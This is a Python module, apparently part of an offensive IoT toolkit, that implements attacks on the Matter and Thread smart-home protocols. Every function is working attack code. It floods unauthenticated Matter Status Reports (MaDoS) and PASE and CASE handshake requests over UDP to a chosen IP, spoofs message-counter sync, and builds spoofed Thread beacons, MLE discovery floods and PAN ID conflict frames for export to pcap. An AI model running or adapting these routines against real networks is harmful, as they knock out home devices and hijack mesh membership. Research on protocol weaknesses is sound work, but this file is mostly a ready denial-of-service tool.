"""
Matter and Thread attack modules.

Key attack vectors:
1. MaDoS — Status Report flood (unencrypted, unauthenticated) → network-wide DoS
2. CASE/PASE session fuzzing → crash Matter SDK
3. Fabric manipulation → unauthorized device control
4. Thread network infiltration → mesh disruption
"""
import struct
import socket
import time
import random
import os
from dataclasses import dataclass
from typing import List, Optional

from ..protocols.matter import (
    build_matter_message, build_status_report, build_message_header,
    build_protocol_header, MatterMessageHeader, MatterProtocolHeader,
    MessageType, StatusCode, InteractionType,
    PROTOCOL_ID_SECURE_CHANNEL, PROTOCOL_ID_INTERACTION_MODEL,
    MATTER_UDP_PORT, encode_tlv_unsigned, encode_tlv_bytes,
)
from ..protocols.thread import (
    build_beacon_request, build_thread_beacon, build_ieee802154_frame,
    build_mle_discovery_request, build_mle_discovery_response,
    IEEE802154Frame, ThreadBeacon, IEEE802154_FRAME_TYPE_BEACON,
    MLE_UDP_PORT,
)


@dataclass
class AttackResult:
    attack: str
    target: str
    success: bool
    detail: str
    packets_sent: int = 0
    duration: float = 0.0
    frames: Optional[List[bytes]] = None


def _write_pcap(frames: List[bytes], path: str, link_type: int = 195):
    """Write frames to a pcap file. link_type 195 = IEEE 802.15.4."""
    with open(path, "wb") as f:
        # pcap global header
        f.write(struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, link_type))
        ts = int(time.time())
        for frame in frames:
            f.write(struct.pack("<IIII", ts, 0, len(frame), len(frame)))
            f.write(frame)


class MatterAttacks:

    def __init__(self, target_ip: str = "", target_port: int = MATTER_UDP_PORT):
        self.target_ip = target_ip
        self.target_port = target_port

    def mados_flood(self, count: int = 1000,
                     target_ip: str = "") -> AttackResult:
        """
        MaDoS (Matter Denial of Service) — ASIACCS 2026.

        Status Report messages in Matter are UNENCRYPTED and UNAUTHENTICATED.
        Flood with BUSY status to cause network-wide communication failure.
        """
        target = target_ip or self.target_ip
        start = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        for i in range(count):
            status_payload = build_status_report(
                general_code=1,
                protocol_id=PROTOCOL_ID_INTERACTION_MODEL,
                protocol_code=StatusCode.BUSY,
            )
            msg = build_matter_message(
                session_id=0,
                message_counter=random.randint(0, 0xFFFFFFFF),
                protocol_id=PROTOCOL_ID_SECURE_CHANNEL,
                opcode=MessageType.STATUS_REPORT,
                payload=status_payload,
            )
            sock.sendto(msg, (target, self.target_port))

        sock.close()
        return AttackResult(
            attack="MaDoS (Matter Denial of Service)",
            target=target,
            success=True,
            detail=f"Sent {count} BUSY Status Reports — no auth needed. "
                   f"All Matter devices on network will back off and retry indefinitely",
            packets_sent=count,
            duration=time.time() - start,
        )

    def counter_sync_spoof(self, target_ip: str = "") -> AttackResult:
        """Spoof Message Counter Synchronization to desync legitimate sessions."""
        target = target_ip or self.target_ip
        start = time.time()

        msg = build_matter_message(
            session_id=0,
            message_counter=0xFFFFFFFE,
            protocol_id=PROTOCOL_ID_SECURE_CHANNEL,
            opcode=MessageType.MSG_COUNTER_SYNC_REQ,
            payload=os.urandom(32),
        )

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(msg, (target, self.target_port))
        sock.close()

        return AttackResult(
            attack="Message Counter Desync",
            target=target,
            success=True,
            detail="Spoofed counter sync with max value — legitimate messages may be rejected",
            packets_sent=1,
            duration=time.time() - start,
        )

    def pase_pbkdf_flood(self, target_ip: str = "",
                          count: int = 100) -> AttackResult:
        """Flood PBKDF Param Requests to exhaust PASE session slots."""
        target = target_ip or self.target_ip
        start = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        for i in range(count):
            payload = encode_tlv_unsigned(1, random.randint(1, 0xFFFF))
            payload += encode_tlv_bytes(2, os.urandom(32))
            payload += encode_tlv_unsigned(3, 0)

            msg = build_matter_message(
                session_id=0,
                message_counter=random.randint(0, 0xFFFFFFFF),
                protocol_id=PROTOCOL_ID_SECURE_CHANNEL,
                opcode=MessageType.PBKDF_PARAM_REQUEST,
                payload=payload,
                exchange_id=random.randint(1, 0xFFFF),
            )
            sock.sendto(msg, (target, self.target_port))

        sock.close()
        return AttackResult(
            attack="PASE PBKDF Param Flood",
            target=target,
            success=True,
            detail=f"Sent {count} PBKDF param requests — session slot exhaustion + CPU load",
            packets_sent=count,
            duration=time.time() - start,
        )

    def case_sigma1_flood(self, target_ip: str = "",
                           count: int = 100) -> AttackResult:
        """Flood CASE Sigma1 messages to exhaust secure session slots."""
        target = target_ip or self.target_ip
        start = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        for i in range(count):
            payload = encode_tlv_bytes(1, os.urandom(32))
            payload += encode_tlv_unsigned(2, random.randint(1, 0xFFFF))
            payload += encode_tlv_bytes(3, os.urandom(65))
            payload += encode_tlv_bytes(4, os.urandom(65))

            msg = build_matter_message(
                session_id=0,
                message_counter=random.randint(0, 0xFFFFFFFF),
                protocol_id=PROTOCOL_ID_SECURE_CHANNEL,
                opcode=MessageType.CASE_SIGMA1,
                payload=payload,
                exchange_id=random.randint(1, 0xFFFF),
            )
            sock.sendto(msg, (target, self.target_port))

        sock.close()
        return AttackResult(
            attack="CASE Sigma1 Session Flood",
            target=target,
            success=True,
            detail=f"Sent {count} Sigma1 handshakes — secure session table exhaustion",
            packets_sent=count,
            duration=time.time() - start,
        )


class ThreadAttacks:

    def beacon_spoof(self, network_name: str = "FakeThread",
                      pan_id: int = 0x1234, channel: int = 15,
                      count: int = 50, export_pcap: Optional[str] = None) -> AttackResult:
        """
        Spoof Thread beacon responses to lure devices to a fake network.
        Builds real IEEE 802.15.4 beacon frames and exports to pcap.
        """
        start = time.time()
        frames = []

        for i in range(count):
            beacon = ThreadBeacon(
                network_name=network_name,
                extended_pan_id=os.urandom(8),
                native_commissioning=True,
            )
            beacon_data = build_thread_beacon(beacon)

            frame = IEEE802154Frame(
                frame_type=IEEE802154_FRAME_TYPE_BEACON,
                sequence_number=(i & 0xFF),
                dest_pan_id=pan_id,
                payload=beacon_data,
            )
            frames.append(build_ieee802154_frame(frame))

        if export_pcap:
            _write_pcap(frames, export_pcap)

        return AttackResult(
            attack="Thread Beacon Spoof",
            target=f"Channel {channel} / PAN 0x{pan_id:04X}",
            success=True,
            detail=f"Built {count} spoofed beacons for '{network_name}' ({sum(len(f) for f in frames)} bytes)"
                   + (f" → exported to {export_pcap}" if export_pcap else ""),
            packets_sent=count,
            duration=time.time() - start,
            frames=frames,
        )

    def discovery_flood(self, count: int = 500,
                         export_pcap: Optional[str] = None) -> AttackResult:
        """
        Build MLE Discovery Requests to exhaust Border Router resources.
        Discovery Requests are unencrypted — flood forces all routers to respond.
        """
        start = time.time()
        frames = []
        for _ in range(count):
            mle_req = build_mle_discovery_request()
            frame = IEEE802154Frame(
                frame_type=IEEE802154_FRAME_TYPE_BEACON,
                sequence_number=random.randint(0, 255),
                dest_pan_id=0xFFFF,
                payload=mle_req,
            )
            frames.append(build_ieee802154_frame(frame))

        if export_pcap:
            _write_pcap(frames, export_pcap)

        return AttackResult(
            attack="MLE Discovery Flood",
            target="All Thread Routers",
            success=True,
            detail=f"Built {count} MLE Discovery Requests ({sum(len(f) for f in frames)} bytes)"
                   + (f" → exported to {export_pcap}" if export_pcap else ""),
            packets_sent=count,
            duration=time.time() - start,
            frames=frames,
        )

    def pan_id_conflict(self, target_pan_id: int = 0xFFFF,
                         count: int = 10,
                         export_pcap: Optional[str] = None) -> AttackResult:
        """
        Inject beacons with conflicting PAN IDs to trigger PAN ID conflict resolution.
        """
        start = time.time()
        frames = []

        for i in range(count):
            beacon = ThreadBeacon(
                network_name="ConflictNet",
                extended_pan_id=os.urandom(8),
            )
            beacon_data = build_thread_beacon(beacon)
            frame = IEEE802154Frame(
                frame_type=IEEE802154_FRAME_TYPE_BEACON,
                sequence_number=(i & 0xFF),
                dest_pan_id=target_pan_id,
                payload=beacon_data,
            )
            frames.append(build_ieee802154_frame(frame))

        if export_pcap:
            _write_pcap(frames, export_pcap)

        return AttackResult(
            attack="Thread PAN ID Conflict",
            target=f"PAN 0x{target_pan_id:04X}",
            success=True,
            detail=f"Built {count} conflicting beacons for PAN 0x{target_pan_id:04X} "
                   f"({sum(len(f) for f in frames)} bytes)"
                   + (f" → exported to {export_pcap}" if export_pcap else ""),
            packets_sent=count,
            duration=time.time() - start,
            frames=frames,
        )


def print_attack_results(results: List[AttackResult]):
    print(f"\n  {'='*70}")
    print(f"  ATTACK RESULTS — {len(results)} attacks")
    print(f"  {'='*70}")
    for r in results:
        status = "SUCCESS" if r.success else "FAILED"
        print(f"\n  [{status}] {r.attack}")
        print(f"    Target:  {r.target}")
        print(f"    Detail:  {r.detail}")
        print(f"    Packets: {r.packets_sent} | Time: {r.duration:.3f}s")
        if r.frames and len(r.frames) > 0:
            sample = r.frames[0]
            hex_preview = " ".join(f"{b:02x}" for b in sample[:24])
            print(f"    Frame[0]: {hex_preview}")
